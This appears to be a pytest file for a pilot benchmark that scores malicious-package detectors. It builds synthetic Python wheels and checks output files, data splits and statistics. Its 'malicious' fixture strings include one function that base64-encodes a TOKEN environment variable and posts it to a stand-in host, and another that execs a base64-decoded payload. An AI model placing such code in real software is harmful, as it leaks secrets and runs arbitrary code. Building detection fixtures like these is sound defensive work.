import csv
import json
import zipfile

import pytest

from scripts.omcbench_pilot import (
    CorpusItem,
    _assign_splits,
    _exact_symmetry_p,
    main,
)

BENIGN = """from pathlib import Path

def read_settings(path):
    return Path(path).read_text()
"""

BENIGN_STRUCTURAL_VARIANT = """\
import json

def parse_settings(text):
    return json.loads(text)
"""

MALICIOUS_SHAPED = """\
import base64
import os
import requests

def send_secret():
    secret = os.getenv("TOKEN")
    payload = base64.b64encode(secret.encode())
    return requests.post("https://example.invalid", data=payload)
"""

MALICIOUS_STRUCTURAL_VARIANT = """\
import base64

def decode_and_run(payload):
    exec(base64.b64decode(payload))
"""


def _archive(path, source):
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as handle:
        handle.writestr("package/main.py", source)


def test_synthetic_pilot_writes_aligned_metadata_only_outputs(tmp_path, capsys):
    root = tmp_path / "corpus"
    packages = root / "packages"
    results = root / "results"
    packages.mkdir(parents=True)
    results.mkdir()
    rows = []
    for index, (label, source) in enumerate(
        [
            ("benign", BENIGN),
            ("benign", BENIGN),
            ("benign", BENIGN_STRUCTURAL_VARIANT),
            ("malicious", MALICIOUS_SHAPED),
            ("malicious", MALICIOUS_SHAPED),
            ("malicious", MALICIOUS_STRUCTURAL_VARIANT),
        ]
    ):
        name = f"sample-{index}.whl"
        _archive(packages / name, source)
        rows.append(
            {
                "folder_name": name,
                "ecosystem": "py",
                "label_true": label,
            }
        )
    with (results / "manifest.csv").open("w", encoding="utf-8", newline="") as file:
        writer = csv.DictWriter(
            file,
            fieldnames=["folder_name", "ecosystem", "label_true"],
        )
        writer.writeheader()
        writer.writerows(rows)
    output = tmp_path / "output"
    code = main(
        [
            str(root),
            "-o",
            str(output),
            "--allow-unpinned",
            "--target-fpr",
            "0.5",
            "--bootstrap",
            "20",
            "--progress-every",
            "10",
        ]
    )

    summary = json.loads(capsys.readouterr().out)
    assert code == 0
    assert summary["packages"] == 6
    assert summary["score_changed_packages"] == 3
    expected = {
        "local_flow_predictions.jsonl",
        "paired_report.json",
        "proximity_predictions.jsonl",
        "sample_audit.jsonl",
        "study.json",
    }
    assert {path.name for path in output.iterdir()} == expected
    report = json.loads((output / "paired_report.json").read_text())
    assert report["alignment"]["rows"] == 6
    predictions = [
        json.loads(line)
        for line in (output / "local_flow_predictions.jsonl").read_text().splitlines()
    ]
    grouped = {}
    for row in predictions:
        grouped.setdefault(row["group_id"], set()).add(row["split"])
    assert all(len(splits) == 1 for splits in grouped.values())
    study = json.loads((output / "study.json").read_text())
    assert not study["corpus"]["pinned"]
    assert study["results"]["status_counts"] == {"ok": 6}
    assert study["grouping"]["normalized_ast_duplicate_groups"] == 2
    assert not report["score_interpretation"]["calibration_metrics_valid"]
    exploratory = report["exploratory_fixed_thresholds"]
    assert not exploratory["claim_eligible"]


def test_group_split_rejects_normalized_ast_cluster_with_conflicting_labels():
    items = [
        CorpusItem("a", "a.whl", 0, group_id="same"),
        CorpusItem("b", "b.whl", 1, group_id="same"),
        CorpusItem("c", "c.whl", 0, group_id="other-benign"),
        CorpusItem("d", "d.whl", 1, group_id="other-malicious"),
    ]
    with pytest.raises(ValueError, match="crosses labels"):
        _assign_splits(items, 0.5, 7)


def test_exact_paired_symmetry_probability_is_two_sided():
    assert _exact_symmetry_p(0, 0) == 1.0
    assert _exact_symmetry_p(4, 0) == 0.125
    assert _exact_symmetry_p(3, 1) == 0.625
